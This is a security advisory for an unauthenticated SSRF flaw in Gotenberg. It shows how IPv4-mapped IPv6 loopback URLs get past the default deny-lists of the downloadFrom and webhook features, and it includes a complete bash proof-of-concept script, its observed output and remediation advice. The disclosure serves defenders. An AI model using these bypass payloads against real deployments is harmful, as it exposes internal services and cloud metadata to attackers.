# [C] Gotenberg vulnerable to unauthenticated SSRF via default deny-list bypass in downloadFrom and webhook

## Summary
Severity: Critical
Advisory: GHSA-4vmc-gm8v-m35h
CVE: CVE-2026-42596
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-4vmc-gm8v-m35h
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0 <8.32.0

## Details
### Summary
The default deny-lists used by Gotenberg's `downloadFrom` feature and `webhook` feature are bypassable. Because the filter is regex-based and case-sensitive, an unauthenticated attacker can supply URLs such as `http://[::ffff:127.0.0.1]:...` and reach loopback or private HTTP services that the default deny-list is intended to block. This crosses a real security boundary because an external caller can force the server to make outbound requests to internal-only targets.

### Details
The issue originates from the shipped default deny-list regexes and the way those regexes are applied:

- `pkg/modules/api/api.go:198-200` defines the default `api-download-from-deny-list`.
- `pkg/modules/webhook/webhook.go:41-43` defines the default `webhook-deny-list`.
- `pkg/gotenberg/filter.go:20-69` evaluates those patterns with `regexp2` using case-sensitive matching.

The attacker-controlled URL then reaches outbound request sinks:

- `pkg/modules/api/context.go:208-282`
  - Reads attacker-supplied `downloadFrom`.
  - Calls `gotenberg.FilterDeadline(...)`.
  - Issues an outbound GET with `retryablehttp.NewRequest(...)` and `client.Do(...)`.
- `pkg/modules/webhook/middleware.go:99-217`
  - Reads `Gotenberg-Webhook-Url` and `Gotenberg-Webhook-Events-Url`.
  - Calls `gotenberg.FilterDeadline(...)`.
  - Constructs a `client` for outbound delivery.
- `pkg/modules/webhook/client.go:39-152`
  - Sends the success or error webhook request.
- `pkg/modules/webhook/client.go:155-216`
  - Sends the webhook event request.

Why the bypass works:

1. The default deny-list only blocks lowercase `http://` and `https://` prefixes.
2. The filtering logic performs case-sensitive regex matching on the raw user input.
3. Go's HTTP stack accepts multiple textual representations of loopback/private addresses that are not covered by the default regex, including IPv4-mapped IPv6 loopback like `http://[::ffff:127.0.0.1]:18081/...`.
4. As a result, a URL can fail the deny-list check but still be interpreted as a valid loopback/private destination by the outbound client.

Confirmed bypass used during verification:

- `http://[::ffff:127.0.0.1]:18081/page_1.pdf`
- `http://[::ffff:127.0.0.1]:18082/upload`
- `http://[::ffff:127.0.0.1]:18082/events`

This is not the same issue as the previously published Chromium deny-list advisories. This finding affects the separate `downloadFrom` and `webhook` URL filtering paths.

### PoC
#### One-command verification
From the repository root:

```bash
cd '/Users/r1zzg0d/Documents/CVE hunting/targets/gotenberg'
./tmp/poc/verify_ssrf_poc.sh
```

What the script does:

1. Builds or reuses a slim local Gotenberg image that contains only the modules needed for this proof.
2. Starts Gotenberg on `127.0.0.1:3000`.
3. Starts an internal-only helper listener inside the same container network namespace.
4. Verifies `downloadFrom` SSRF by forcing Gotenberg to fetch a PDF from `http://[::ffff:127.0.0.1]:18081/page_1.pdf`.
5. Verifies `webhook` SSRF by forcing Gotenberg to POST to `http://[::ffff:127.0.0.1]:18082/upload` and `http://[::ffff:127.0.0.1]:18082/events`.
6. Writes evidence artifacts to disk.

Expected success output:

```text
[4/6] Verifying downloadFrom SSRF bypass with http://[::ffff:127.0.0.1]:18081/page_1.pdf
PASS downloadFrom: Gotenberg fetched an internal-only loopback URL and returned PDF metadata
[5/6] Verifying webhook SSRF bypass with http://[::ffff:127.0.0.1]:18082/upload
PASS webhook: Gotenberg POSTed to an internal-only loopback listener
```

Evidence files created by the script:

- `/Users/r1zzg0d/Documents/CVE hunting/targets/gotenberg/tmp/poc/artifacts/downloadfrom-metadata.json`
- `/Users/r1zzg0d/Documents/CVE hunting/targets/gotenberg/tmp/poc/artifacts/webhook.log`

#### Manual evidence commands
The following commands were run after the verifier completed successfully:

```bash
jq '.' '/Users/r1zzg0d/Documents/CVE hunting/targets/gotenberg/tmp/poc/artifacts/downloadfrom-metadata.json'
cat '/Users/r1zzg0d/Documents/CVE hunting/targets/gotenberg/tmp/poc/artifacts/webhook.log'
```

Observed output:

```json
{
  "page_1.pdf": {
    "CreateDate": "2025:02:17 14:46:38+00:00",
    "FileType": "PDF",
    "FileTypeExtension": "pdf",
    "Linearized": "No",
    "MIMEType": "application/pdf",
    "ModifyDate": "2025:02:17 14:46:38+00:00",
    "PDFVersion": 1.7,
    "PageCount": 1,
    "Producer": "PDFTron built-in office converter, V11.2.0-d27340a176\n",
    "SourceFile": "/tmp/d924af59-709e-4d08-8ebc-dafec9048235/b0d0dcdc-84ff-4919-8fe6-f6bdbbd9a68a/eae4a9bc-e3e3-48e2-b5bd-114408d87d84.pdf"
  }
}
```

```text
POST /upload len=4363 content-type=application/pdf
POST /events len=126 content-type=application/json
```

PoC Video:

https://github.com/user-attachments/assets/a70a4e09-e9a7-4df8-a9a5-77b09fbd59f3



Interpretation:

- The JSON metadata proves Gotenberg successfully fetched and parsed a PDF from an internal loopback URL.
- The webhook log proves Gotenberg sent outbound requests to internal loopback endpoints that should have been blocked by the default deny-list.

### `verify_ssrf_poc.sh`
```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
IMAGE="${IMAGE:-gotenberg-local-ssrf-poc:minimal}"
DOCKERFILE="${DOCKERFILE:-$ROOT/tmp/poc/Dockerfile.minimal}"
GOTENBERG_NAME="${GOTENBERG_NAME:-gotenberg-ssrf-poc}"
HELPER_NAME="${HELPER_NAME:-gotenberg-ssrf-helper}"
PORT="${PORT:-3000}"
ARTIFACT_DIR="${ARTIFACT_DIR:-$ROOT/tmp/poc/artifacts}"
TEST_PDF="$ROOT/test/integration/testdata/page_1.pdf"
DOWNLOAD_JSON="$ARTIFACT_DIR/downloadfrom-metadata.json"
WEBHOOK_LOG="$ARTIFACT_DIR/webhook.log"
HELPER_SCRIPT="$ARTIFACT_DIR/internal_helper.py"
DOWNLOAD_BYPASS_URL="http://[::ffff:127.0.0.1]:18081/page_1.pdf"
WEBHOOK_UPLOAD_BYPASS_URL="http://[::ffff:127.0.0.1]:18082/upload"
WEBHOOK_EVENTS_BYPASS_URL="http://[::ffff:127.0.0.1]:18082/events"
PDF_ENGINE_FLAGS=(
  "--pdfengines-merge-engines=qpdf"
  "--pdfengines-split-engines=qpdf"
  "--pdfengines-flatten-engines=qpdf"
  "--pdfengines-convert-engines=qpdf"
  "--pdfengines-read-metadata-engines=exiftool"
  "--pdfengines-write-metadata-engines=exiftool"
  "--pdfengines-encrypt-engines=qpdf"
  "--pdfengines-embed-engines=qpdf"
  "--pdfengines-read-bookmarks-engines=qpdf"
  "--pdfengines-write-bookmarks-engines=qpdf"
  "--pdfengines-watermark-engines=qpdf"
  "--pdfengines-stamp-engines=qpdf"
  "--pdfengines-rotate-engines=qpdf"
)

red() { printf '\033[31m%s\033[0m\n' "$*"; }
green() { printf '\033[32m%s\033[0m\n' "$*"; }
blue() { printf '\033[34m%s\033[0m\n' "$*"; }

cleanup() {
  docker rm -f "$HELPER_NAME" >/dev/null 2>&1 || true
  docker rm -f "$GOTENBERG_NAME" >/dev/null 2>&1 || true
}

fail() {
  red "$1"
  printf '\n--- gotenberg logs ---\n'
  docker logs "$GOTENBERG_NAME" 2>/dev/null || true
  printf '\n--- helper logs ---\n'
  docker logs "$HELPER_NAME" 2>/dev/null || true
  exit 1
}

trap cleanup EXIT

mkdir -p "$ARTIFACT_DIR"
: > "$WEBHOOK_LOG"

if [[ ! -f "$TEST_PDF" ]]; then
  red "Missing test PDF: $TEST_PDF"
  exit 1
fi

if [[ ! -f "$DOCKERFILE" ]]; then
  red "Missing Dockerfile: $DOCKERFILE"
  exit 1
fi

if ! docker image inspect "$IMAGE" >/dev/null 2>&1; then
  blue "[1/6] Building slim verification image: $IMAGE"
  docker build -q -t "$IMAGE" -f "$DOCKERFILE" "$ROOT" >/dev/null
else
  blue "[1/6] Reusing existing image: $IMAGE"
fi

blue "[2/6] Starting minimal Gotenberg on http://127.0.0.1:$PORT"
cleanup
docker run -d --rm \
  --name "$GOTENBERG_NAME" \
  -p "$PORT:3000" \
  "$IMAGE" \
  --webhook-enable-sync-mode=true \
  "${PDF_ENGINE_FLAGS[@]}" >/dev/null

for _ in $(seq 1 45); do
  if curl -fsS "http://127.0.0.1:$PORT/health" >/dev/null 2>&1; then
    break
  fi
  sleep 1
done

if ! curl -fsS "http://127.0.0.1:$PORT/health" >/dev/null 2>&1; then
  fail "Gotenberg did not become healthy"
fi

cat > "$HELPER_SCRIPT" <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from threading import Event, Thread

PDF_PATH = Path("/srv/page_1.pdf")
LOG_PATH = Path("/work/webhook.log")
PDF_BYTES = PDF_PATH.read_bytes()


class DownloadHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/pdf")
        self.send_header("Content-Disposition", 'attachment; filename="page_1.pdf"')
        self.send_header("Content-Length", str(len(PDF_BYTES)))
        self.end_headers()
        self.wfile.write(PDF_BYTES)

    def log_message(self, fmt, *args):
        return


class WebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length)
        with LOG_PATH.open("a", encoding="utf-8") as f:
            f.write(
                f"{self.command} {self.path} len={len(body)} "
                f"content-type={self.headers.get('Content-Type', '')}\n"
            )
        self.send_response(200)
        self.end_headers()

    do_PATCH = do_POST
    do_PUT = do_POST

    def log_message(self, fmt, *args):
        return


def serve(addr, handler):
    HTTPServer(addr, handler).serve_forever()


Thread(target=serve, args=(("127.0.0.1", 18081), DownloadHandler), daemon=True).start()
Thread(target=serve, args=(("127.0.0.1", 18082), WebhookHandler), daemon=True).start()

print("internal helper ready", flush=True)
Event().wait()
PY

blue "[3/6] Starting internal-only helper inside the same network namespace"
docker run -d --rm \
  --name "$HELPER_NAME" \
  --network "container:$GOTENBERG_NAME" \
  -v "$TEST_PDF:/srv/page_1.pdf:ro" \
  -v "$ARTIFACT_DIR:/work" \
  -v "$HELPER_SCRIPT:/app/internal_helper.py:ro" \
  python:3.11-alpine \
  python /app/internal_helper.py >/dev/null

for _ in $(seq 1 20); do
  if docker logs "$HELPER_NAME" 2>&1 | grep -q "internal helper ready"; then
    break
  fi
  sleep 1
done

if ! docker logs "$HELPER_NAME" 2>&1 | grep -q "internal helper ready"; then
  fail "Internal helper did not start"
fi

blue "[4/6] Verifying downloadFrom SSRF bypass with $DOWNLOAD_BYPASS_URL"
download_status="$(
  curl -sS \
    -o "$DOWNLOAD_JSON" \
    -w '%{http_code}' \
    -X POST "http://127.0.0.1:$PORT/forms/pdfengines/metadata/read" \
    -F "downloadFrom=[{\"url\":\"$DOWNLOAD_BYPASS_URL\"}]"
)"

if [[ "$download_status" != "200" ]]; then
  cat "$DOWNLOAD_JSON" 2>/dev/null || true
  fail "downloadFrom verification failed with HTTP $download_status"
fi

if ! jq -e 'has("page_1.pdf")' "$DOWNLOAD_JSON" >/dev/null 2>&1; then
  cat "$DOWNLOAD_JSON" || true
  fail "downloadFrom verification failed: expected metadata for page_1.pdf"
fi

green "PASS downloadFrom: Gotenberg fetched an internal-only loopback URL and returned PDF metadata"

blue "[5/6] Verifying webhook SSRF bypass with $WEBHOOK_UPLOAD_BYPASS_URL"
webhook_status="$(
  curl -sS \
    -o /dev/null \
    -w '%{http_code}' \
    -X POST "http://127.0.0.1:$PORT/forms/pdfengines/flatten" \
    -H "Gotenberg-Webhook-Url: $WEBHOOK_UPLOAD_BYPASS_URL" \
    -H "Gotenberg-Webhook-Events-Url: $WEBHOOK_EVENTS_BYPASS_URL" \
    -F "files=@$TEST_PDF"
)"

if [[ "$webhook_status" != "204" ]]; then
  fail "webhook verification failed with HTTP $webhook_status"
fi

if ! grep -q '^POST /upload ' "$WEBHOOK_LOG"; then
  cat "$WEBHOOK_LOG" || true
  fail "webhook verification failed: /upload was not hit"
fi

if ! grep -q '^POST /events ' "$WEBHOOK_LOG"; then
  cat "$WEBHOOK_LOG" || true
  fail "webhook verification failed: /events was not hit"
fi

green "PASS webhook: Gotenberg POSTed to an internal-only loopback listener"

blue "[6/6] Evidence files"
printf 'downloadFrom metadata: %s\n' "$DOWNLOAD_JSON"
printf 'webhook log:          %s\n' "$WEBHOOK_LOG"

printf '\n--- downloadFrom metadata excerpt ---\n'
jq '{filename_present: has("page_1.pdf"), sample_keys: (."page_1.pdf" | keys[0:6])}' "$DOWNLOAD_JSON"

printf '\n--- webhook log ---\n'
cat "$WEBHOOK_LOG"

printf '\n'
green "Verification complete"
printf 'Tip: the first run may take time because it builds and pulls images. For a 10-15 second video, run this script once to warm the cache, then record the second run.\n'
```

### Impact
This is an unauthenticated SSRF vulnerability. Any user who can reach a Gotenberg instance can coerce it into making outbound HTTP requests to loopback and potentially other private/internal addresses despite the default deny-list. That can expose internal HTTP services, cloud metadata endpoints, local admin APIs, and service-to-service interfaces that are not intended to be reachable from the public network.

Affected users are operators who rely on the default `downloadFrom` and `webhook` deny-lists for SSRF protection. In practice, an attacker can:

- Read content from internal HTTP endpoints through `downloadFrom`.
- Trigger state-changing POST/PATCH/PUT requests through the `webhook` feature.
- Reach services bound only to localhost from the perspective of the Gotenberg host or container.

### Remediation
1. Normalize and structurally validate URLs before any allow-list or deny-list decision.
   Parse with `net/url`, lowercase the scheme/host where appropriate, canonicalize bracketed IPv6 forms, strip trailing dots, and normalize IPv4-mapped IPv6 addresses before evaluation.

2. Replace regex-only private-address filtering with resolved IP validation.
   Resolve the hostname, evaluate every resolved IP with `net/netip`, and block loopback, RFC1918, link-local, unspecified, ULA, multicast, and IPv4-mapped IPv6 private/loopback targets. Re-validate after redirects as well.

3. Reconsider the security default for outbound URL features.
   Either disable `downloadFrom` and `webhook` by default, or ship a strict default policy that only allows `http`/`https` plus explicit operator allow-lists. If the feature remains enabled, apply the same canonicalization and IP checks consistently to `downloadFrom`, `webhook`, error URLs, and event URLs.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-4vmc-gm8v-m35h
- https://nvd.nist.gov/vuln/detail/CVE-2026-42596
- https://github.com/gotenberg/gotenberg
